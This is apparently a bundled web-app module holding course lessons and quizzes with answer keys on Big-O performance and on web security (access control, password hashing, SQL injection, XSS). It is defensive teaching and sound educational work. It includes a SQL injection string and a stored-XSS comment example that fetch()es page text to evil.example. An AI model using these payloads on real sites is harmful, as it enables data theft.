for (const u of users) sendMail(u);

// O(n²): a loop INSIDE a loop over the same data
for (const a of users)
  for (const b of users)
    if (a !== b && a.email === b.email) dupes.push(a);`}},{type:"code",code:{lang:"ts",text:`// O(log n): the search range halves each step
let lo = 0, hi = sorted.length - 1;
while (lo <= hi) {
  const mid = (lo + hi) >> 1;
  if (sorted[mid] === target) return mid;
  if (sorted[mid] < target) lo = mid + 1;
  else hi = mid - 1;
}`}},{type:"list",items:["One loop over n → **O(n)**","Loops one **after** another → add → still O(n)","Loop **inside** a loop → multiply → O(n²), or **O(n × m)** for two different lists","Range cut in half each step → **O(log n)**","Inner loop over a small fixed thing (7 weekdays, 3 lines per order) → it does not multiply by n"]},{type:"example",title:"Ask the key question",text:'Not "is there a nested loop?" but "**what does the inner loop run over?**" The lines of one order? Fine. All orders again? That is O(n²).'}],remember:"After each other → add. Inside each other → multiply.",questions:[{id:"performance.reading-code.1",kind:"code",difficulty:"medium",prompt:"There are n orders, each with about 3 lines. What is the Big-O of this code?",code:{lang:"csharp",text:`foreach (var order in orders)          // n orders
    foreach (var line in order.Lines)  // ~3 lines each
        total += line.Price;`},choices:["O(n²) — every nested loop is O(n²)","O(log n) — the inner loop is short","O(n) — it visits each line once","O(1) — the work per order is small"],answer:2,why:"The inner loop runs over the lines of **one** order, not over all orders. Total work = total number of lines ≈ 3n, which is O(n).",remember:"Nested is not automatically O(n²). Check what the inner loop runs over."},{id:"performance.reading-code.2",kind:"code",difficulty:"medium",prompt:"What is the Big-O here, and is there a faster way?",code:{lang:"ts",text:`function hasDuplicate(ids: number[]): boolean {
  for (let i = 0; i < ids.length; i++)
    for (let j = i + 1; j < ids.length; j++)
      if (ids[i] === ids[j]) return true;
  return false;
}`},choices:["O(n²) — use a Set and check `has` in one loop","O(n) — it is already optimal","O(log n) — because `j` starts at `i + 1`","O(n²) — but nothing faster exists"],answer:0,why:"Starting `j` at `i + 1` halves the work, but n²/2 is still O(n²). With a `Set` you check and add each id once: O(n) time, using O(n) extra memory."},{id:"performance.reading-code.3",kind:"code",difficulty:"hard",prompt:"Which loop is O(log n)?",code:{lang:"ts",text:`// A
for (let i = 0; i < n; i += 2) work();
// B
for (let i = 1; i < n; i *= 2) work();
// C
for (let i = 0; i < n; i++)
  for (let j = 0; j < 10; j++) work();`},choices:["A","C","B","All three are O(n)"],answer:2,why:"B doubles `i` each time, so it reaches n after about log₂ n steps. A runs n/2 times and C runs 10n times — both are O(n)."},{id:"performance.reading-code.4",kind:"scenario",difficulty:"hard",prompt:"A sync job matches 50,000 orders against 2,000 warehouses with a nested loop (orders outside, warehouses inside). A PR swaps the loops so warehouses are outside. Does that fix the speed?",choices:["Yes — a small outer loop makes it O(n)","Yes — it halves the total work","No — swapping makes it O(n³)","No — it is still 100 million checks"],answer:3,why:"50,000 × 2,000 = 2,000 × 50,000. Swapping does not change n × m. The real fix: put warehouses in a Dictionary by id, then do 50,000 O(1) lookups.",remember:"n × m = m × n. Replace the inner search, do not reorder it."}]},{id:"performance.hidden-loops",title:"Hidden loops",summary:"The O(n²) that looks like one loop.",minutes:5,blocks:[{type:"text",text:"The most common O(n²) in real code does not look like two loops. The second loop is **hidden inside a method call**."},{type:"list",items:["JS: `includes`, `indexOf`, `find`, `findIndex`, `filter`, `some`, `shift` — all O(n) on an array","C#: `List.Contains`, `List.Find`, `IndexOf`, `Remove(item)`, `Insert(0, x)` — all O(n)","LINQ: `First(pred)`, `Any(pred)`, `Where(...)`, `Count()` on a query — they loop for you"]},{type:"code",code:{lang:"ts",text:`// ❌ O(n × m): includes() scans "banned" for every user
const ok = users.filter(u => !banned.includes(u.id));

// ✅ O(n + m): build a Set once, has() is O(1) average
const bannedSet = new Set(banned);
const ok2 = users.filter(u => !bannedSet.has(u.id));`}},{type:"code",code:{lang:"csharp",text:`// ❌ Find scans the whole customer list for every order
foreach (var o in orders)
    o.Customer = customers.Find(c => c.Id == o.CustomerId);

// ✅ Build a dictionary once (O(n)), then O(1) per lookup
var byId = customers.ToDictionary(c => c.Id);
foreach (var o in orders)
    o.Customer = byId[o.CustomerId];`}},{type:"text",text:"**LINQ `Count()` in a loop condition.** On a `List<T>` it is fast (it reads the `Count` property). On a **query** like `users.Where(...)`, it runs the whole query **every time** the condition is checked."},{type:"code",code:{lang:"csharp",text:`var active = users.Where(u => u.IsActive); // a query, not a list
for (int i = 0; i < active.Count(); i++)   // re-runs Where each time
    Notify(active.ElementAt(i));           // walks from the start again

// ✅ foreach (var u in users.Where(u => u.IsActive)) Notify(u);`}},{type:"text",text:"**String `+=` in a loop (C#).** Strings never change. Each `+=` builds a new string and copies all the old characters. Over many rounds that is O(n²) copying. Use `StringBuilder` or `string.Join`. (Modern JS engines handle `+=` much better, so this is mainly a C# problem.)"},{type:"code",code:{lang:"csharp",text:`// ❌ copies the growing string on every row
string csv = "";
foreach (var row in rows) csv += row.ToCsv() + "\\n";

// ✅ appends into one growing buffer
var sb = new StringBuilder();
foreach (var row in rows) sb.AppendLine(row.ToCsv());`}}],remember:"A search inside a loop is a loop inside a loop. Build a Set or Dictionary once.",questions:[{id:"performance.hidden-loops.1",kind:"perf",difficulty:"medium",prompt:"This line takes several seconds. `orders` has 200,000 items, `vipIds` has 20,000. What is the best fix?",code:{lang:"ts",text:"const vipOrders = orders.filter(o => vipIds.includes(o.customerId));"},choices:["Use a classic `for` loop instead of `filter`","Use `indexOf` instead of `includes`","Turn `vipIds` into a `Set` and use `has()`","Sort `orders` before filtering"],answer:2,why:"`includes` scans up to 20,000 ids for each of 200,000 orders — up to 4 billion checks. With a Set, each check is O(1) on average, so the total is about 220,000 operations.",remember:"`.includes` inside a loop → make a Set first."},{id:"performance.hidden-loops.2",kind:"code",difficulty:"hard",prompt:"`users` is a `List<User>` with 50,000 items. Why is this loop so slow?",code:{lang:"csharp",text:`var active = users.Where(u => u.IsActive);
for (int i = 0; i < active.Count(); i++)
{
    Notify(active.ElementAt(i));
}`},choices:["`Where` copies the whole list on every line","`Count()` and `ElementAt()` re-run the query each time","`for` loops are slower than `foreach` in C#","`Notify` is called twice for each user"],answer:1,why:"`active` is a lazy query, not a list. Every `Count()` walks all 50,000 users, and every `ElementAt(i)` walks from the start again. That makes the loop O(n²). Use `foreach`, or call `.ToList()` once.",remember:"A LINQ query re-runs every time you touch it."},{id:"performance.hidden-loops.3",kind:"debug",difficulty:"medium",prompt:'A C# CSV export of 100,000 rows takes minutes, and the garbage collector runs all the time. The loop body is `csv += line + "\\n";`. What is the cause?',choices:["Each `+=` copies the whole string built so far","The disk is too slow to write CSV","CSV escaping is expensive for each row","`foreach` creates a new enumerator per row"],answer:0,why:"Strings are immutable. Row 90,000 copies almost the full file again, and each old copy becomes garbage. `StringBuilder` appends into one buffer instead."},{id:"performance.hidden-loops.4",kind:"compare",difficulty:"medium",prompt:"You must remove 10,000 cancelled orders from a `List<Order>` of 500,000. Which is better?",code:{lang:"csharp",text:`// A
foreach (var c in cancelled) orders.Remove(c);

// B
var ids = cancelled.Select(c => c.Id).ToHashSet();
orders.RemoveAll(o => ids.Contains(o.Id));`},choices:["A","B"],answer:1,why:"Each `Remove(item)` searches the list and shifts the items after it: O(n), done 10,000 times. `RemoveAll` makes one pass, and the HashSet check is O(1) on average."}]},{id:"performance.sorting-searching",title:"Sorting and searching",summary:"Sort once, search fast — never sort in a loop.",minutes:4,blocks:[{type:"text",text:"Sorting costs **O(n log n)**. That is good: 1 million items → about 20 million steps. Built-in sorts (`Array.prototype.sort`, `List<T>.Sort`, LINQ `OrderBy`) are already this fast. Do not write your own."},{type:"text",text:"Once data is sorted, you can use **binary search**: look at the middle, throw away half, repeat. **O(log n)**."},{type:"diagram",text:`find 37 in sorted data (16 items)

[3 8 12 15 21 26 30 33 37 41 45 50 58 62 70 81]
                    ▲ mid 33 → 37 is bigger, go right
[37 41 45 50 58 62 70 81]
          ▲ mid 50 → 37 is smaller, go left
[37 41 45]
    ▲ mid 41 → go left
[37] → found in 4 steps (a simple loop needs 9)`},{type:"compare",left:{title:"Sort once, search many ✅",items:["Sort: O(n log n), one time","Each search: O(log n)","Good when data rarely changes"]},right:{title:"Sort inside a loop ⚠️",items:["Each sort: O(n log n)","Done n times → worse than O(n²)","Common bug: `OrderBy` inside a `foreach`"]}},{type:"text",text:'For exact matches ("find id 42"), a Dictionary or Set is usually simpler than sort + binary search. Sorted data wins when you need **ranges** ("all orders from 10:00 to 11:00") or the **top N**.'},{type:"example",title:"You already use this",text:"A database index is sorted (a B-tree). `WHERE CreatedAt BETWEEN ...` jumps to the first match in O(log n), then reads forward. Same idea as binary search."}],remember:"Sort once, then search fast. Never sort inside a loop.",questions:[{id:"performance.sorting-searching.1",kind:"perf",difficulty:"hard",prompt:"There are 20,000 products and 300,000 offers. This code is very slow. What is the main cost?",code:{lang:"csharp",text:`foreach (var p in products)
{
    var cheapest = offers
        .Where(o => o.ProductId == p.Id)
        .OrderBy(o => o.Price)
        .FirstOrDefault();
    p.BestOffer = cheapest;
}`},choices:["`OrderBy`, because sorting is always slow","`FirstOrDefault` returning null too often","`Where` scans all 300,000 offers for each product","The `foreach` over 20,000 products itself"],answer:2,why:"20,000 × 300,000 = 6 billion checks. Each sort only sees the few offers of one product. Group the offers once (for example `GroupBy` + `ToDictionary` by ProductId), then look each product up.",remember:"Group once, look up many times."},{id:"performance.sorting-searching.2",kind:"debug",difficulty:"medium",prompt:"A teammate calls `List<User>.BinarySearch` with an **email** comparer. The list is sorted by **name**. Results look random: sometimes found, sometimes not. Why?",choices:["`BinarySearch` only works on numbers","The list is too big for binary search","The list is not sorted by the key being searched","Emails contain the @ character"],answer:2,why:'Binary search decides "go left or right" based on order. If the list is not sorted by email, it throws away the wrong half and misses items that are there.',remember:"Binary search needs data sorted by the same key."},{id:"performance.sorting-searching.3",kind:"scenario",difficulty:"medium",prompt:'You hold 1 million log entries in memory, sorted by time. Users ask for "everything between 10:00 and 10:05". Which approach is efficient?',choices:["Binary search for 10:00, then read forward until 10:05","Scan every entry and check its time","Put entries in a HashSet and call `Contains`","Sort the entries again before each request"],answer:0,why:"Binary search finds the start in ~20 steps, then you read only the matching entries. A HashSet cannot answer range questions, and re-sorting already sorted data is wasted work."}]},{id:"performance.space",title:"Space complexity and memory trade-offs",summary:"Paying memory to buy speed — on purpose.",minutes:4,blocks:[{type:"text",text:"**Space complexity** = how much **extra memory** your code needs as the data grows. Same letters: O(1) extra memory, O(n) extra memory, and so on."},{type:"diagram",text:`Find duplicates in n ids

A) nested loops   time O(n²)   extra memory O(1)
B) HashSet        time O(n)    extra memory O(n)

You "pay" memory to "buy" speed.`},{type:"text",text:"This trade is usually worth it: a `HashSet` of 1 million ints takes only tens of MB. But memory is not free. Watch for these:"},{type:"list",items:["**Loading everything**: `ToListAsync()` on 10 million rows puts all of them in RAM. Stream or page instead.","**Copies**: `.ToList()`, `.ToArray()`, `[...arr]`, `.map()` each make a new O(n) copy. Fine once, costly in a hot loop.","**Caches without limits**: a static Dictionary that only grows is a memory leak. Give it a size limit or an expiry.","**Deep recursion**: each call uses stack space. Too deep → stack overflow."]},{type:"code",code:{lang:"csharp",text:`// ❌ All 10M rows in memory at once
var rows = await db.Events.ToListAsync();
foreach (var e in rows) Write(e);

// ✅ One row at a time (streaming)
await foreach (var e in db.Events.AsNoTracking().AsAsyncEnumerable())
    Write(e);`}},{type:"example",title:"Real world",text:'A "cache every product forever" Dictionary worked fine for a year. Then the catalog grew to 3 million items. Pods started restarting with OutOfMemory. A cache with a size limit and expiry (for example `MemoryCache` with `SizeLimit`) fixed it.'}],remember:"Speed often costs memory. Make that trade on purpose, and put a limit on anything that grows.",questions:[{id:"performance.space.1",kind:"compare",difficulty:"medium",prompt:"A batch job must find duplicate ids among 50 million ids. The server has plenty of RAM. Which approach?",choices:["Nested loops: O(n²) time, O(1) memory","HashSet: O(n) time, O(n) memory"],answer:1,why:"(50 million)² checks would take far too long. The HashSet needs memory, but the server has it. If memory were tight, sort first and compare neighbours: O(n log n) time, little extra memory."},{id:"performance.space.2",kind:"debug",difficulty:"medium",prompt:"An API's memory grows slowly all week and drops only when the pod restarts. You find `static Dictionary<string, Report> _cache` that stores every report ever requested and never removes anything. What is the problem?",choices:["Dictionary lookups leak memory by design","Static fields are cleared after each request","An unbounded cache that only ever grows","String keys use too much CPU"],answer:2,why:"A static field lives as long as the app. Every new report key adds memory that is never freed. Add a size limit and/or expiry, or use `MemoryCache`.",remember:"Every cache needs a limit."},{id:"performance.space.3",kind:"perf",difficulty:"easy",prompt:"A nightly export loads 8 million rows with `ToListAsync()`, then writes them to a file. It crashes with `OutOfMemoryException`. What is the best fix?",choices:["Add more RAM to the server every time the data grows","Call `GC.Collect()` right after loading to free memory","Convert the list to an array first, since arrays use less memory","Stream the rows (or read in pages) and write as you go"],answer:3,why:"The job never needs all rows at once. Streaming keeps memory flat, whether there are 8 million rows or 80 million. More RAM only delays the next crash."},{id:"performance.space.4",kind:"code",difficulty:"medium",prompt:"How much **extra memory** does this use, as `nums` grows?",code:{lang:"ts",text:`const doubled = nums.map(n => n * 2);
const big = doubled.filter(n => n > 100);
return big.length;`},choices:["O(1) — it only returns one number","O(n) — `map` and `filter` create new arrays","O(n²) — it makes two passes","O(log n) — `filter` drops some items"],answer:1,why:"`map` builds a new array of n items, and `filter` builds another one. Two passes is still O(n) time, not O(n²). A single loop with a counter would need only O(1) extra memory."}]},{id:"performance.measure",title:"Measure before optimizing",summary:"Big-O shows what might be slow. Measuring shows what is slow.",minutes:4,blocks:[{type:"text",text:"Big-O tells you what **might** become slow. Only **measuring** tells you what **is** slow. Guessing is often wrong."},{type:"diagram",text:`One API request (850 ms total)

DB query        ███████████████████████  800 ms
JSON serialize  █                         20 ms
Other           █                         28 ms
Your loop       ▏                          2 ms

→ Making the loop 5× faster saves ~1.6 ms.
→ Fix the DB query first.`},{type:"list",items:["Browser DevTools → **Performance** and **Network** tabs","`console.time()` / `performance.now()` in JS, `Stopwatch` in C# for quick checks","**BenchmarkDotNet** for fair micro-benchmarks in .NET (it handles warm-up)","A **profiler** (Visual Studio, dotTrace, PerfView) to see where time really goes","**Tracing / APM** in production (OpenTelemetry, Application Insights)"]},{type:"list",items:["Measure with **production-sized data**. 100 test rows hide O(n²).","Fix the **biggest** cost first. Usually it is I/O: database, network, disk.","Measure again after the change. Keep it only if it really helped."]},{type:"text",text:'Big-O ignores the cost of each step. A loop over 50 items that makes an HTTP call each time is O(n), but much slower than an O(n²) loop over 50 items in memory. Use both: Big-O for "what happens at scale", measuring for "what hurts now".'}],remember:"Measure, fix the biggest thing, measure again.",questions:[{id:"performance.measure.1",kind:"scenario",difficulty:"easy",prompt:'A page feels slow. A teammate wants to rewrite every `map().filter()` chain into hand-written `for` loops "for speed". What should happen first?',choices:["Rewrite all the chains in the codebase","Switch to a faster frontend framework","Profile the page to see where time goes","Add caching to every function"],answer:2,why:"Without measuring, you may optimize code that takes 1% of the time. A profile shows whether the problem is rendering, network, a big loop, or something else."},{id:"performance.measure.2",kind:"perf",difficulty:"medium",prompt:"A trace of a 1.2 s request shows: database 1,050 ms, JSON 40 ms, an in-memory sort of 300 items 3 ms. Where do you start?",choices:["The database query and its execution plan","Replace the sort with a faster algorithm","Switch to a faster JSON serializer","Add more web servers"],answer:0,why:"The database is ~88% of the time. Even a perfect sort saves 3 ms. More servers do not make one slow query faster.",remember:"Optimize the biggest bar first."},{id:"performance.measure.3",kind:"compare",difficulty:"hard",prompt:"Two versions process 40 items. **A** is O(n): one HTTP call per item, ~50 ms each. **B** is O(n²): 1,600 cheap in-memory checks, then one batched HTTP call. Which is faster in practice?",choices:["A — lower Big-O always wins","B — one network call beats 40 calls"],answer:1,why:"A waits about 40 × 50 ms = 2 seconds. B does 1,600 checks in microseconds plus one 50 ms call. Big-O ignores the cost per step, and I/O is very expensive. (If n grew to millions, B's O(n²) would hurt — keep both in mind.)"},{id:"performance.measure.4",kind:"mcq",difficulty:"medium",prompt:"You time a C# method once with `Stopwatch`: 120 ms. You run it again in the same process: 4 ms. What is the most likely reason?",choices:["The OS moved the second run to a faster core","Warm-up: JIT compiling, cold caches, opening connections","Stopwatch is not accurate below one second","The garbage collector speeds up code it has seen"],answer:1,why:"The first call pays one-time costs: the JIT compiles the method, caches are cold, connections are opened. Measure many runs, or use BenchmarkDotNet, which does warm-up for you.",remember:"Never trust a single timing."}]}],cheatSheet:[{title:"Big-O at a glance (n = 1,000,000)",items:[{term:"O(1)",meaning:"Same work at any size — dict[key], arr[i], Set.has · 1 step"},{term:"O(log n)",meaning:"Halve each step — binary search, index lookup · ~20 steps"},{term:"O(n)",meaning:"One pass — loop, includes, Contains, Find · 1M steps"},{term:"O(n log n)",meaning:"Good sort — Sort, OrderBy · ~20M steps"},{term:"O(n²)",meaning:"Loop in a loop over the same data · 10¹² steps ❌"},{term:"O(n × m)",meaning:"Loop over A, search all of B inside"},{term:"Space",meaning:"Extra memory as data grows — Set/Dictionary/copies = O(n)"}]},{title:"Red flags in code",items:[{term:"includes / Contains in a loop",meaning:"Build a Set / HashSet once"},{term:"find / Find / First(pred) in a loop",meaning:"Build a Map / Dictionary once"},{term:"Count() / ElementAt() on a query in a loop",meaning:"Use foreach, or call ToList() once"},{term:"string += in a loop (C#)",meaning:"Use StringBuilder or string.Join"},{term:"Sort / OrderBy inside a loop",meaning:"Sort once, outside the loop"},{term:"shift() / Insert(0, x) / Remove(item) in a loop",meaning:"O(n) each — use an index, a Queue, or RemoveAll"},{term:"ToList() on millions of rows",meaning:"Stream or page instead"},{term:"Cache that only grows",meaning:"Memory leak — add a size limit or expiry"}]},{title:"Habits",items:[{term:"Measure first",meaning:"Profiler or trace before rewriting anything"},{term:"Production-sized data",meaning:"Small test data hides O(n²)"},{term:"Biggest cost first",meaning:"Usually I/O: database, network, disk"},{term:"Constants matter",meaning:"O(n) with an HTTP call per item can lose to O(n²) in memory"},{term:"Single timing",meaning:"Includes warm-up — run many times or use BenchmarkDotNet"},{term:"Memory for speed",meaning:"Set / Dictionary cost memory, save huge amounts of time"}]}]},x=Object.freeze(Object.defineProperty({__proto__:null,default:v},Symbol.toStringTag,{value:"Module"})),T={id:"security",title:"Security",emoji:"🔐",tagline:"Injection, XSS, CSRF, secrets — and how to stop them",lessons:[{id:"security.access-control",title:"Logged in is not the same as allowed",summary:"Broken access control: the most common API bug.",minutes:4,blocks:[{type:"text",text:`**Authentication** = proving who you are.
**Authorization** = checking what you may do.
Many real data leaks are not clever hacks. The user is logged in, and the code simply forgets to ask: **"Is this yours?"**`},{type:"code",code:{lang:"csharp",text:`// ❌ Any logged-in user can read ANY invoice
[Authorize]
[HttpGet("invoices/{id}")]
public async Task<IActionResult> Get(int id)
{
    var invoice = await db.Invoices.FindAsync(id);
    return Ok(invoice);
}

// ✅ Only finds the invoice if it belongs to the caller
var invoice = await db.Invoices.SingleOrDefaultAsync(
    i => i.Id == id && i.UserId == currentUserId);
if (invoice is null) return NotFound();`}},{type:"example",title:"IDOR in one minute",text:"**IDOR** = Insecure Direct Object Reference. A user changes `/invoices/1043` to `/invoices/1044` and sees someone else's invoice. Scanning tools try this automatically, for every id."},{type:"list",items:["Check permissions on the **server**, on every request. Hiding a button in React or Vue is UX, not security.","**Deny by default**: new endpoints need auth unless someone marks them public on purpose.","**Least privilege**: give users, services and DB logins only the rights they really need.","Do not bind request bodies straight onto database entities. Use a DTO with only the fields the user may change."]}],remember:'Logged in ≠ allowed. Check "is this yours?" on the server, every time.',questions:[{id:"security.access-control.1",kind:"code",difficulty:"medium",prompt:"Using the ❌ code from the lesson, a logged-in tester changes the URL from `/invoices/1043` (theirs) to `/invoices/1044`. What do they get?",code:{lang:"csharp",text:`[Authorize]
[HttpGet("invoices/{id}")]
public async Task<IActionResult> Get(int id)
{
    var invoice = await db.Invoices.FindAsync(id);
    return Ok(invoice);
}`},choices:["401, because the invoice belongs to another user","403, because [Authorize] checks ownership","Another customer's invoice","404, because ids are private"],answer:2,why:"`[Authorize]` only checks that someone is logged in. Nothing checks ownership, so any id works for any user.",remember:'[Authorize] = logged in. It does not mean "owns this".'},{id:"security.access-control.2",kind:"scenario",difficulty:"easy",prompt:'The "Delete user" button is hidden in the Vue app for non-admins. The API endpoint has `[Authorize]` but no role check. Is it safe?',choices:["Yes, normal users cannot see the button","No, any logged-in user can call the API directly","Yes, `[Authorize]` means admins only","Yes, as long as the site uses HTTPS"],answer:1,why:'Anyone can send HTTP requests with DevTools, curl or a script. The UI is not a security boundary. The API must check the role, e.g. `[Authorize(Roles = "Admin")]` or a policy.'},{id:"security.access-control.3",kind:"compare",difficulty:"medium",prompt:"A reporting service only reads sales data. Which database login follows **least privilege**?",choices:["`db_owner`, so reports never fail on rights","`sa`, with a strong password rotated monthly","A login with SELECT on the sales tables only","The main app login, to avoid an extra account"],answer:2,why:"If the reporting service is hacked or has a bug, a read-only login on a few tables limits the damage. The others could delete or change everything.",remember:"Least privilege = smallest blast radius."},{id:"security.access-control.4",kind:"code",difficulty:"hard",prompt:'A user sends `{"name":"Ann","isAdmin":true}` to this endpoint. What happens?',code:{lang:"csharp",text:`public class User
{
    public int Id { get; set; }
    public string Name { get; set; } = "";
    public bool IsAdmin { get; set; }
}

[Authorize]
[HttpPut("users/me")]
public async Task<IActionResult> Update(User body)
{
    body.Id = CurrentUserId;
    db.Users.Update(body);   // saves every property
    await db.SaveChangesAsync();
    return NoContent();
}`},choices:["EF Core ignores IsAdmin, so only the name changes","The request fails with 400","The user makes themselves an admin","[Authorize] blocks the IsAdmin field"],answer:2,why:"Model binding fills every public property, including `IsAdmin`, and `Update` saves them all. This is called **over-posting** (mass assignment). Accept a DTO with only `Name` instead.",remember:"Bind requests to DTOs, not entities."}]},{id:"security.passwords",title:"Storing passwords",summary:"Slow hash + salt. Never plain SHA-256.",minutes:4,blocks:[{type:"text",text:"Rule 1: never store the password itself. Store a **hash** from a **slow password-hashing function**. At login, hash the attempt the same way and compare."},{type:"compare",left:{title:"Bad ❌",items:["Plain text","Encrypted (the key can leak too)","MD5, SHA-1, or SHA-256 alone — fast, GPUs try billions per second","No salt, or one salt for everybody"]},right:{title:"Good ✅",items:["Argon2id, bcrypt, or PBKDF2 with many iterations","A unique random salt per user","Slow on purpose, with a tunable cost","From a well-known library — never home-made"]}},{type:"text",text:"A **salt** is a random value stored next to the hash. Two users with the same password get different hashes. Attackers cannot use precomputed tables, and must crack each user separately."},{type:"diagram",text:`"Summer2026!" + salt A ─► Argon2id ─► $argon2id$...x9Q
"Summer2026!" + salt B ─► Argon2id ─► $argon2id$...p3L
  same password, different hashes`},{type:"code",code:{lang:"csharp",text:`// ASP.NET Core Identity: PBKDF2 + random salt built in
var hasher = new PasswordHasher<User>();
user.PasswordHash = hasher.HashPassword(user, password);

var result = hasher.VerifyHashedPassword(
    user, user.PasswordHash, attempt);
bool ok = result != PasswordVerificationResult.Failed;`}},{type:"code",code:{lang:"ts",text:`// Node.js with the "argon2" package (salt is automatic)
import argon2 from 'argon2';

const hash = await argon2.hash(password);
const ok = await argon2.verify(hash, attempt);`}},{type:"list",items:['Login errors: say "wrong email or password", not which one was wrong.',"Limit login attempts (rate limit, lockout) to slow down guessing.","Never log passwords — not even in debug logs."]}],remember:"Passwords → slow hash (Argon2id / bcrypt / PBKDF2) + unique salt. Never plain SHA-256.",questions:[{id:"security.passwords.1",kind:"compare",difficulty:"medium",prompt:"Which way of storing passwords is best?",choices:["`SHA256(password)`","`AES.Encrypt(password)` with the key in appsettings",'`SHA256(password + "MyAppSalt")`',"bcrypt with a per-user salt and a good cost"],answer:3,why:"bcrypt is slow on purpose and salts each user. SHA-256 is fast (cheap to guess), a shared salt still lets attackers crack everyone in one run, and encryption can be reversed by anyone who gets the key."},{id:"security.passwords.2",kind:"mcq",difficulty:"medium",prompt:"SHA-256 is a secure hash function. Why is it still a bad choice for passwords on its own?",choices:["It is too slow and makes logins time out under load","It is fast, so attackers can test billions of guesses","It can be reversed to the password with the right key","Its 256-bit output is too long for most user tables"],answer:1,why:"SHA-256 was built to be fast. For passwords, speed helps the attacker. Password hashes like Argon2id and bcrypt are slow and tunable, so each guess costs real time.",remember:"For passwords, slow is a feature."},{id:"security.passwords.3",kind:"debug",difficulty:"hard",prompt:"Your users table leaks. You notice 300 users have **exactly the same** password hash value. What does that tell you about how passwords were stored?",choices:["Nothing, hash collisions are common","Passwords were encrypted, not hashed","bcrypt was used correctly","No unique salt per user was used"],answer:3,why:"With a unique salt, even equal passwords give different hashes. Equal hashes mean no salt (or a shared one) — and those 300 people probably used the same weak password."},{id:"security.passwords.4",kind:"scenario",difficulty:"medium",prompt:'The login page says "No account exists with this email" for unknown emails, and "Wrong password" otherwise. What is the risk?',choices:["None, clear messages like this are good for users","It makes the stored password hashes easier to crack","Attackers can find out which emails have accounts","The extra email lookup makes each login much slower"],answer:2,why:'This is called **user enumeration**. A list of real accounts makes phishing and password guessing easier. Use one message: "wrong email or password". Do the same for "forgot password".'}]},{id:"security.injection",title:"SQL injection",summary:"When user input becomes part of your SQL.",minutes:4,blocks:[{type:"text",text:"**Injection** happens when user input becomes part of the **code** (here: SQL) instead of staying **data**."},{type:"code",code:{lang:"csharp",text:`// ❌ string concatenation
var sql = "SELECT * FROM Users WHERE Email = '" + email + "'";

// attacker sends:  ' OR '1'='1
// SQL becomes:
// SELECT * FROM Users WHERE Email = '' OR '1'='1'
// → returns every user`}},{type:"code",code:{lang:"csharp",text:`// ✅ parameter: the value travels separately from the SQL
using var cmd = new SqlCommand(
    "SELECT * FROM Users WHERE Email = @email", conn);
cmd.Parameters.Add("@email", SqlDbType.NVarChar, 256).Value = email;

// ✅ EF Core LINQ is parameterized for you
var user = await db.Users.SingleOrDefaultAsync(u => u.Email == email);`}},{type:"code",code:{lang:"ts",text:`// ❌ template string pastes input into the SQL
await pool.query(\`SELECT * FROM users WHERE email = '\${email}'\`);

// ✅ placeholder + values (node-postgres)
await pool.query('SELECT * FROM users WHERE email = $1', [email]);`}},{type:"list",items:["**Parameters** are the fix. Escaping quotes by hand is not.","ORMs are safe by default, but raw SQL helpers (like EF Core `FromSqlRaw` with string building) can still be unsafe.","Table and column names cannot be parameters. For `ORDER BY` from user input, use an **allowlist**.","**Input validation** (length, format, allowed values) is a good extra layer, but never a replacement for parameters.","Least privilege limits damage: the app login should not be able to `DROP TABLE`."]}],remember:"User input is data, never code. Use parameters.",questions:[{id:"security.injection.1",kind:"code",difficulty:"easy",prompt:"What is wrong with this search?",code:{lang:"ts",text:`app.get('/products', async (req, res) => {
  const q = req.query.q;
  const rows = await db.query(
    \`SELECT * FROM products WHERE name LIKE '%\${q}%'\`
  );
  res.json(rows);
});`},choices:["Nothing, template strings escape values","LIKE does not support the % wildcard","SQL injection: the input is pasted into the SQL","It should use double quotes"],answer:2,why:"A JS template string is plain string building. Use a placeholder and pass `%${q}%` as a parameter value instead."},{id:"security.injection.2",kind:"code",difficulty:"hard",prompt:"Which EF Core line is vulnerable to SQL injection?",code:{lang:"csharp",text:`// A
db.Users.FromSqlRaw($"SELECT * FROM Users WHERE Name = '{name}'");

// B
db.Users.FromSql($"SELECT * FROM Users WHERE Name = {name}");`},choices:["A","B","Both","Neither, EF Core always uses parameters"],answer:0,why:'`FromSqlRaw` takes a plain string, so the `$""` is turned into finished SQL text first. `FromSql` (EF Core 7+, `FromSqlInterpolated` before) takes the interpolated string and turns `{name}` into a real parameter.',remember:"FromSqlRaw + string building = injection."},{id:"security.injection.3",kind:"scenario",difficulty:"medium",prompt:'A sortable table sends `?sort=price`. The API builds `"... ORDER BY " + sort`. You cannot use a parameter for a column name. What is the safest fix?',choices:["Escape single quotes in `sort` before adding it","Limit `sort` to 20 characters and trim spaces","Map `sort` to a fixed list of allowed columns","Reject `sort` if it contains the word DROP"],answer:2,why:"An allowlist means only known values like `price` or `name` can reach the SQL. Anything else gets a default or a 400. Escaping and length limits can be bypassed."},{id:"security.injection.4",kind:"truefalse",difficulty:"medium",prompt:"If the frontend form checks that the email looks valid, the API does not need parameterized queries.",choices:["True","False"],answer:1,why:"Attackers can skip your frontend and call the API directly. Client-side validation is for user experience. The server must validate and use parameters.",remember:"Frontend validation = UX. Server validation = security."}]},{id:"security.xss",title:"XSS: when user text becomes script",summary:"React and Vue protect you — until you opt out.",minutes:4,blocks:[{type:"text",text:"**XSS** (cross-site scripting) = an attacker gets their JavaScript to run in **your** page, in **another user's** browser. That script can do whatever the user can: read the page, call your API as them, show a fake login form."},{type:"example",title:"Stored XSS",text:`A user posts this comment:
\`<img src=x onerror="fetch('https://evil.example/?d='+document.body.innerText)">\`
The site saves it and renders it as HTML for every visitor. Every visitor now runs the attacker's code.`},{type:"text",text:"Good news: React and Vue **escape** text by default. `{comment}` in JSX or `{{ comment }}` in Vue shows the characters `<img ...>` as text. Nothing runs. The danger is when you **opt out**:"},{type:"code",code:{lang:"ts",text:`// React
<p>{comment}</p>                                     // ✅ escaped
<p dangerouslySetInnerHTML={{ __html: comment }} />  // ❌ raw HTML

// Vue template
<p>{{ comment }}</p>          <!-- ✅ escaped -->
